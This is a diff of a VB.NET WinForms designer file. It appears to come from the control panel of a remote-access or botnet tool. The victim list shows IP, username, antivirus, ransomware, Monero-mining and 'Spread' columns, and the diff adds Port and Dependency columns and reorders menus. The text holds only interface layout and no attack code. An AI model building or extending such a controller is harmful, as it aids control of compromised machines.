@@ -38,6 +38,8 @@ Partial Class Main
         Me.RANS = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me.XMR = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me.SP = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
+        Me._PORT = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
+        Me.DotNET = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me.PING = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me.NOTE_ = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me.Main_Rightclick = New System.Windows.Forms.ContextMenuStrip(Me.components)
@@ -77,15 +79,15 @@ Partial Class Main
         Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.ToolStripSeparator2 = New System.Windows.Forms.ToolStripSeparator()
-        Me.ToolStripSeparator3 = New System.Windows.Forms.ToolStripSeparator()
-        Me.OnConnectToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
-        Me.ToolStripSeparator4 = New System.Windows.Forms.ToolStripSeparator()
-        Me.AboutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.ListviewOptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.ClientColorToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
         Me.ClientNoteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.ClientFolderToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
         Me.RemoveOfflineToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.ToolStripSeparator3 = New System.Windows.Forms.ToolStripSeparator()
+        Me.OnConnectToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.ToolStripSeparator4 = New System.Windows.Forms.ToolStripSeparator()
+        Me.AboutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.Flag = New System.Windows.Forms.ImageList(Me.components)
         Me.MetroTabPage4 = New MetroFramework.Controls.MetroTabPage()
         Me.CAPsec = New System.Windows.Forms.NumericUpDown()
@@ -206,7 +208,7 @@ Partial Class Main
             Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
         Me.L1.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
         Me.L1.BorderStyle = System.Windows.Forms.BorderStyle.None
-        Me.L1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.Country, Me.IP, Me.ID, Me.USERN, Me.VER, Me.OS, Me.INSDATE, Me.AV, Me.RANS, Me.XMR, Me.SP, Me.PING, Me.NOTE_})
+        Me.L1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.Country, Me.IP, Me.ID, Me.USERN, Me.VER, Me.OS, Me.INSDATE, Me.AV, Me.RANS, Me.XMR, Me.SP, Me._PORT, Me.DotNET, Me.PING, Me.NOTE_})
         Me.L1.ContextMenuStrip = Me.Main_Rightclick
         Me.L1.Font = New System.Drawing.Font("Segoe UI", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
         Me.L1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
@@ -276,6 +278,14 @@ Partial Class Main
         '
         Me.SP.Text = " Spread "
         Me.SP.Width = 100
+        '
+        '_PORT
+        '
+        Me._PORT.Text = "Port"
+        '
+        'DotNET
+        '
+        Me.DotNET.Text = " Dependency "
         '
         'PING
         '
@@ -587,6 +597,46 @@ Partial Class Main
         Me.ToolStripSeparator2.Name = "ToolStripSeparator2"
         Me.ToolStripSeparator2.Size = New System.Drawing.Size(197, 6)
         '
+        'ListviewOptionsToolStripMenuItem
+        '
+        Me.ListviewOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ClientColorToolStripMenuItem1, Me.ClientNoteToolStripMenuItem, Me.ClientFolderToolStripMenuItem1, Me.RemoveOfflineToolStripMenuItem})
+        Me.ListviewOptionsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
+        Me.ListviewOptionsToolStripMenuItem.Name = "ListviewOptionsToolStripMenuItem"
+        Me.ListviewOptionsToolStripMenuItem.Size = New System.Drawing.Size(200, 30)
+        Me.ListviewOptionsToolStripMenuItem.Text = "Listview Options"
+        '
+        'ClientColorToolStripMenuItem1
+        '
+        Me.ClientColorToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
+        Me.ClientColorToolStripMenuItem1.ForeColor = System.Drawing.SystemColors.Control
+        Me.ClientColorToolStripMenuItem1.Name = "ClientColorToolStripMenuItem1"
+        Me.ClientColorToolStripMenuItem1.Size = New System.Drawing.Size(220, 30)
+        Me.ClientColorToolStripMenuItem1.Text = "Client Color"
+        '
+        'ClientNoteToolStripMenuItem
+        '
+        Me.ClientNoteToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
+        Me.ClientNoteToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
+        Me.ClientNoteToolStripMenuItem.Name = "ClientNoteToolStripMenuItem"
+        Me.ClientNoteToolStripMenuItem.Size = New System.Drawing.Size(220, 30)
+        Me.ClientNoteToolStripMenuItem.Text = "Client Note"
+        '
+        'ClientFolderToolStripMenuItem1
+        '
+        Me.ClientFolderToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
+        Me.ClientFolderToolStripMenuItem1.ForeColor = System.Drawing.SystemColors.Control
+        Me.ClientFolderToolStripMenuItem1.Name = "ClientFolderToolStripMenuItem1"
+        Me.ClientFolderToolStripMenuItem1.Size = New System.Drawing.Size(220, 30)
+        Me.ClientFolderToolStripMenuItem1.Text = "Client Folder"
+        '
+        'RemoveOfflineToolStripMenuItem
+        '
+        Me.RemoveOfflineToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
+        Me.RemoveOfflineToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
+        Me.RemoveOfflineToolStripMenuItem.Name = "RemoveOfflineToolStripMenuItem"
+        Me.RemoveOfflineToolStripMenuItem.Size = New System.Drawing.Size(220, 30)
+        Me.RemoveOfflineToolStripMenuItem.Text = "Remove Offline"
+        '
         'ToolStripSeparator3
         '
         Me.ToolStripSeparator3.Name = "ToolStripSeparator3"
@@ -610,46 +660,6 @@ Partial Class Main
         Me.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem"
         Me.AboutToolStripMenuItem.Size = New System.Drawing.Size(200, 30)
         Me.AboutToolStripMenuItem.Text = "About"
-        '
-        'ListviewOptionsToolStripMenuItem
-        '
-        Me.ListviewOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ClientColorToolStripMenuItem1, Me.ClientNoteToolStripMenuItem, Me.ClientFolderToolStripMenuItem1, Me.RemoveOfflineToolStripMenuItem})
-        Me.ListviewOptionsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
-        Me.ListviewOptionsToolStripMenuItem.Name = "ListviewOptionsToolStripMenuItem"
-        Me.ListviewOptionsToolStripMenuItem.Size = New System.Drawing.Size(200, 30)
-        Me.ListviewOptionsToolStripMenuItem.Text = "Listview Options"
-        '
-        'ClientColorToolStripMenuItem1
-        '
-        Me.ClientColorToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
-        Me.ClientColorToolStripMenuItem1.ForeColor = System.Drawing.SystemColors.Control
-        Me.ClientColorToolStripMenuItem1.Name = "ClientColorToolStripMenuItem1"
-        Me.ClientColorToolStripMenuItem1.Size = New System.Drawing.Size(253, 30)
-        Me.ClientColorToolStripMenuItem1.Text = "Client Color"
-        '
-        'ClientNoteToolStripMenuItem
-        '
-        Me.ClientNoteToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
-        Me.ClientNoteToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
-        Me.ClientNoteToolStripMenuItem.Name = "ClientNoteToolStripMenuItem"
-        Me.ClientNoteToolStripMenuItem.Size = New System.Drawing.Size(253, 30)
-        Me.ClientNoteToolStripMenuItem.Text = "Client Note"
-        '
-        'ClientFolderToolStripMenuItem1
-        '
-        Me.ClientFolderToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
-        Me.ClientFolderToolStripMenuItem1.ForeColor = System.Drawing.SystemColors.Control
-        Me.ClientFolderToolStripMenuItem1.Name = "ClientFolderToolStripMenuItem1"
-        Me.ClientFolderToolStripMenuItem1.Size = New System.Drawing.Size(253, 30)
-        Me.ClientFolderToolStripMenuItem1.Text = "Client Folder"
-        '
-        'RemoveOfflineToolStripMenuItem
-        '
-        Me.RemoveOfflineToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
-        Me.RemoveOfflineToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
-        Me.RemoveOfflineToolStripMenuItem.Name = "RemoveOfflineToolStripMenuItem"
-        Me.RemoveOfflineToolStripMenuItem.Size = New System.Drawing.Size(253, 30)
-        Me.RemoveOfflineToolStripMenuItem.Text = "Remove Offline"
         '
         'Flag
         '
@@ -1783,4 +1793,6 @@ Partial Class Main
     Friend WithEvents ClientNoteToolStripMenuItem As ToolStripMenuItem
     Friend WithEvents ClientFolderToolStripMenuItem1 As ToolStripMenuItem
     Friend WithEvents RemoveOfflineToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents DotNET As ColumnHeader
+    Friend WithEvents _PORT As ColumnHeader
 End Class
